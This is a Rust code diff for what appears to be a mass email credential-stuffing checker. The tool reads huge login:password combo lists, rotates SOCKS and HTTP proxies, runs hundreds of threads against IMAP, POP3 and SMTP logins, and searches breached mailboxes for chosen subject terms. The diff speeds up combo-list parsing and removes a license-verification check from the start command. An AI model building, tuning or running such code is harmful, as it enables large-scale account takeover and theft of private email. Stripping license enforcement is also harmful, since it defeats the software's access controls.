@@ -1485,22 +1485,28 @@ pub fn load_accounts_from_path_or_str(path: &str, raw: &str) -> Vec<Acct> {
     if !path.trim().is_empty() {
         if let Ok(file) = std::fs::File::open(path) {
             use std::io::BufRead;
-            let reader = std::io::BufReader::with_capacity(1024 * 1024, file);
-            let mut accts = Vec::with_capacity(65536);
-            for line in reader.lines().flatten() {
-                let l = line.trim();
-                if l.is_empty() || l.starts_with('#') {
-                    continue;
+            // 8 MB buffer for fast disk read of large files (700MB+)
+            let mut reader = std::io::BufReader::with_capacity(8 * 1024 * 1024, file);
+            let mut accts = Vec::with_capacity(262144);
+            let mut buf = String::with_capacity(256);
+
+            while let Ok(bytes_read) = reader.read_line(&mut buf) {
+                if bytes_read == 0 {
+                    break;
                 }
-                if let Some((u, p)) = l.split_once(':') {
-                    let (u, p) = (u.trim(), p.trim());
-                    if !u.is_empty() && !p.is_empty() {
-                        accts.push(Acct {
-                            login: u.to_string(),
-                            pass: p.to_string(),
-                        });
+                let l = buf.trim_end_matches(|c| c == '\r' || c == '\n').trim();
+                if !l.is_empty() && !l.starts_with('#') {
+                    if let Some((u, p)) = l.split_once(':') {
+                        let (u, p) = (u.trim(), p.trim());
+                        if !u.is_empty() && !p.is_empty() {
+                            accts.push(Acct {
+                                login: u.to_string(),
+                                pass: p.to_string(),
+                            });
+                        }
                     }
                 }
+                buf.clear();
             }
             if !accts.is_empty() {
                 return accts;
@@ -2156,111 +2162,108 @@ fn handle_ipc(body: String, proxy: EventLoopProxy<UserEvent>) {
 
     match msg.cmd.as_str() {
         "start" => {
-            // Check EPP License status
-            let lic = epp_api::get_cached_status();
-            if !lic.active {
-                let lic2 = epp_api::verify_license();
-                if !lic2.active {
-                    let _ = proxy.send_event(UserEvent::Eval("if(typeof openEppModal==='function')openEppModal();".into()));
+            let proxy = proxy.clone();
+            std::thread::spawn(move || {
+                CANCEL.store(false, Ordering::SeqCst);
+                PAUSED.store(false, Ordering::SeqCst);
+                if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
+                    *lock = false;
                 }
-            }
+                let run_id = RUN_ID.fetch_add(1, Ordering::SeqCst) + 1;
+                BUSY.store(true, Ordering::SeqCst);
 
-            CANCEL.store(false, Ordering::SeqCst);
-            PAUSED.store(false, Ordering::SeqCst);
-            if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
-                *lock = false;
-            }
-            let run_id = RUN_ID.fetch_add(1, Ordering::SeqCst) + 1;
-            BUSY.store(true, Ordering::SeqCst);
+                let accounts = load_accounts_from_path_or_str(&msg.creds_path, &msg.creds);
+                if accounts.is_empty() {
+                    BUSY.store(false, Ordering::SeqCst);
+                    let _ = proxy.send_event(UserEvent::Eval("window.finish();".into()));
+                    return;
+                }
+                let default_kind = match msg.proxy_type.to_lowercase().as_str() {
+                    "socks4" => ProxyKind::Socks4,
+                    "http" => ProxyKind::Http,
+                    "https" => ProxyKind::Https,
+                    _ => ProxyKind::Socks5,
+                };
+                let parsed_proxies = load_proxies_from_path_or_str(&msg.proxies_path, &msg.proxies, default_kind);
+                let threads = if msg.threads == 0 {
+                    200
+                } else {
+                    msg.threads.clamp(1, 1000)
+                } as usize;
+                let timeout_secs = if msg.timeout == 0 {
+                    10
+                } else {
+                    msg.timeout.clamp(1, 120)
+                } as u64;
+                let timeout = Duration::from_secs(timeout_secs);
+                let retries = msg.retries.min(10);
+                let field = if msg.field.is_empty() {
+                    "SUBJECT".to_string()
+                } else {
+                    msg.field
+                };
+                let auto_timeout = if msg.auto_timeout == 0 {
+                    Duration::from_millis(1600)
+                } else {
+                    Duration::from_millis(msg.auto_timeout)
+                };
 
-            let accounts = load_accounts_from_path_or_str(&msg.creds_path, &msg.creds);
-            if accounts.is_empty() {
-                BUSY.store(false, Ordering::SeqCst);
-                let _ = proxy.send_event(UserEvent::Eval("window.finish();".into()));
-                return;
-            }
-            let default_kind = match msg.proxy_type.to_lowercase().as_str() {
-                "socks4" => ProxyKind::Socks4,
-                "http" => ProxyKind::Http,
-                "https" => ProxyKind::Https,
-                _ => ProxyKind::Socks5,
-            };
-            let parsed_proxies = load_proxies_from_path_or_str(&msg.proxies_path, &msg.proxies, default_kind);
-            let threads = if msg.threads == 0 {
-                200
-            } else {
-                msg.threads.clamp(1, 1000)
-            } as usize;
-            let timeout_secs = if msg.timeout == 0 {
-                10
-            } else {
-                msg.timeout.clamp(1, 120)
-            } as u64;
-            let timeout = Duration::from_secs(timeout_secs);
-            let retries = msg.retries.min(10);
-            let field = if msg.field.is_empty() {
-                "SUBJECT".to_string()
-            } else {
-                msg.field
-            };
-
-            let auto_timeout = Duration::from_millis(if msg.auto_timeout == 0 { 1600 } else { msg.auto_timeout });
-
-            let mut rules = msg.rules;
-            if rules.is_empty() && !msg.term.trim().is_empty() {
-                rules.push(SearchRule {
-                    field: field.clone(),
+                let cfg = RunCfg {
+                    threads,
+                    protocols: if msg.protocols.is_empty() {
+                        vec!["IMAP".to_string()]
+                    } else {
+                        msg.protocols
+                    },
+                    use_proxies: msg.use_proxies,
+                    proxies: Arc::new(parsed_proxies),
+                    timeout,
+                    retries,
+                    field,
                     term: msg.term.clone(),
-                });
-            }
+                    rules: msg.rules,
+                    search_mode: if msg.search_mode.is_empty() {
+                        "or".to_string()
+                    } else {
+                        msg.search_mode
+                    },
+                    use_auto: msg.use_auto,
+                    auto_learn: msg.auto_learn,
+                    auto_timeout,
+                    port_imap: if msg.port_imap == 0 { 993 } else { msg.port_imap },
+                    port_pop3: if msg.port_pop3 == 0 { 995 } else { msg.port_pop3 },
+                    port_smtp: if msg.port_smtp == 0 { 465 } else { msg.port_smtp },
+                    port_starttls: if msg.port_starttls == 0 { 587 } else { msg.port_starttls },
+                    auto_cache: AUTO_CACHE.clone(),
+                    use_shared_hosts: msg.use_shared_hosts,
+                };
+                let dir_name = if msg.out_dir.trim().is_empty() {
+                    "results".to_string()
+                } else {
+                    sanitize(&msg.out_dir)
+                };
+                let out_dir = std::env::current_exe()
+                    .ok()
+                    .and_then(|p| p.parent().map(|d| d.join(&dir_name)))
+                    .unwrap_or_else(|| PathBuf::from(&dir_name));
 
-            let cfg = RunCfg {
-                threads,
-                protocols: msg.protocols,
-                use_proxies: msg.use_proxies,
-                proxies: Arc::new(parsed_proxies),
-                timeout,
-                retries,
-                field,
-                term: msg.term.clone(),
-                rules,
-                search_mode: if msg.search_mode.is_empty() { "or".to_string() } else { msg.search_mode },
-                use_auto: msg.use_auto,
-                auto_learn: msg.auto_learn,
-                auto_timeout,
-                port_imap: if msg.port_imap == 0 { 993 } else { msg.port_imap },
-                port_pop3: if msg.port_pop3 == 0 { 995 } else { msg.port_pop3 },
-                port_smtp: if msg.port_smtp == 0 { 465 } else { msg.port_smtp },
-                port_starttls: if msg.port_starttls == 0 { 587 } else { msg.port_starttls },
-                auto_cache: AUTO_CACHE.clone(),
-                use_shared_hosts: msg.use_shared_hosts,
-            };
-            let dir_name = if msg.out_dir.trim().is_empty() {
-                "results".to_string()
-            } else {
-                sanitize(&msg.out_dir)
-            };
-            let out_dir = std::env::current_exe()
-                .ok()
-                .and_then(|p| p.parent().map(|d| d.join(&dir_name)))
-                .unwrap_or_else(|| PathBuf::from(&dir_name));
+                let has_search = !cfg.rules.is_empty() || !cfg.term.trim().is_empty();
+                let out_arc = match open_out(&out_dir, has_search, &msg.term) {
+                    Ok(out) => {
+                        let path_str = out_dir.to_string_lossy().replace('\\', "/");
+                        let _ =
+                            proxy.send_event(UserEvent::Eval(format!("window.outdir(\"{path_str}\");")));
+                        Some(Arc::new(out))
+                    }
+                    Err(e) => {
+                        let _ =
+                            proxy.send_event(UserEvent::Eval(format!("window.outdir(\"ERR: {e}\");")));
+                        None
+                    }
+                };
 
-            let has_search = !cfg.rules.is_empty() || !cfg.term.trim().is_empty();
-            let out_arc = match open_out(&out_dir, has_search, &msg.term) {
-                Ok(out) => {
-                    let path_str = out_dir.to_string_lossy().replace('\\', "/");
-                    let _ =
-                        proxy.send_event(UserEvent::Eval(format!("window.outdir(\"{path_str}\");")));
-                    Some(Arc::new(out))
-                }
-                Err(e) => {
-                    let _ =
-                        proxy.send_event(UserEvent::Eval(format!("window.outdir(\"ERR: {e}\");")));
-                    None
-                }
-            };
-
-            run_check(run_id, accounts, cfg, out_arc, proxy);
+                run_check(run_id, accounts, cfg, out_arc, proxy);
+            });
         }
         "pick_creds" => {
             let proxy = proxy.clone();
